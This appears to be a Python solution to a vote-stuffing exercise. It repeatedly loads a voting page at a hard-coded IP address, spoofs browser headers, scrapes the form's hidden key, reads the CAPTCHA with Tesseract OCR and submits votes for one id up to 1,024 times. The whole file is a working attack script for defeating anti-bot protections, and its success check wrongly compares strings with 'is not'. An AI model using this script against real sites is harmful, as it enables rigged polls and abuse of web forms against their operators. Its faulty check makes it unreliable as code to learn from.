#!/usr/bin/python3

import os, requests
from bs4 import BeautifulSoup
import pytesseract
try:
    import Image
except ImportError:
    from PIL import Image

url = "http://158.69.76.135/level3.php"
IP = "http://158.69.76.135"
UserPc = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) "
              "Gecko/20100101 Firefox/64.0")

Reference = {"User-Agent": UserPc, "referer": url}
IdVote = {"id": "1149", "holdthedoor": "Submit", "key": "", "captcha": ""}

if __name__ == "__main__":
    i = 1
    while i < 1025:
        session = requests.session()
        Website = session.get(url, headers=Reference)
        MySoup = BeautifulSoup(Website.text, "html.parser")
        hidden_value = MySoup.find("form", {"method": "post"})
        hidden_value = hidden_value.find("input", {"type": "hidden"})
        IdVote["key"] = hidden_value["value"]
        CaptPath = MySoup.find("form", {"method": "post"}).find("img")
        CaptPath = IP + CaptPath["src"]
        CaptImg = open("captcha.png", "wb")
        CaptImg.write(session.get(CaptPath).content)
        CaptImg.close()
        CaptUrl = pytesseract.image_to_string("captcha.png")
        os.remove("captcha.png")
        IdVote["captcha"] = CaptUrl
        PostUrl =  session.post(url, headers=Reference, data=IdVote)
        if str(PostUrl.content) is not "b'See you later hacker! [11]'":
            i = i + 1
